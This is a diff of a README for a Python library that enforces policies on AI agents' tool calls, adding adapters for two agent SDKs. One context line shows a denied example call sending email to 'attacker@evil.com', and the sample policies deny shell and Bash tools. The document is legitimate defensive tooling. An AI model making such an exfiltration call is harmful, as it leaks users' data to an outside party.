@@ -39,7 +39,65 @@ send_email({"to": "attacker@evil.com"})       # raises ToolCallDenied
 pip install tool-call-guard
 ```
 
-Zero dependencies, fully typed, Python 3.9+. Validators accept plain callables (return `True`/`False`/reason-string, or raise) or pydantic-style model classes (anything with `model_validate`).
+The core has zero dependencies and supports Python 3.9+. Provider SDKs are optional extras and currently require Python 3.10+ through their upstream packages. Validators accept plain callables (return `True`/`False`/reason-string, or raise) or pydantic-style model classes (anything with `model_validate`).
+
+## Provider adapters
+
+### OpenAI Agents SDK
+
+```sh
+pip install "tool-call-guard[openai]"
+```
+
+Attach the policy adapter to an OpenAI function tool's input guardrails. A denied call never reaches the function; by default the adapter returns a safe rejection message to the model.
+
+```python
+from agents import function_tool
+from tool_call_guard import Guard
+from tool_call_guard.integrations.openai_agents import create_tool_input_guardrail
+
+guard = Guard({
+    "tools": {
+        "search": {},
+        "shell": {"action": "deny"},
+    }
+})
+
+@function_tool(tool_input_guardrails=[create_tool_input_guardrail(guard)])
+def search(query: str) -> str:
+    """Search internal documents."""
+    return search_documents(query)
+```
+
+Set `denied_behavior="raise_exception"` to trip the run instead of returning model-visible rejection content. The default rejection text is generic; use the `message` option when the model should receive a curated reason. Invalid JSON arguments fail closed and are never copied into the adapter response.
+
+### Anthropic Claude Agent SDK
+
+```sh
+pip install "tool-call-guard[anthropic]"
+```
+
+Register the adapter as a `PreToolUse` hook:
+
+```python
+from claude_agent_sdk import ClaudeAgentOptions
+from tool_call_guard import Guard
+from tool_call_guard.integrations.claude_agent_sdk import create_hook_matcher
+
+guard = Guard({
+    "tools": {
+        "Read": {},
+        "mcp__docs__*": {},
+        "Bash": {"action": "deny"},
+    }
+})
+
+options = ClaudeAgentOptions(
+    hooks={"PreToolUse": [create_hook_matcher(guard)]},
+)
+```
+
+Allowed calls return no permission decision, so the SDK's native permission checks still run. Denied calls return a structured `PreToolUse` denial with generic text unless you set the `message` option. With `mode="dry-run"`, the hook records `would_allow` without changing the SDK's permission flow.
 
 ## What the policy gives you
 
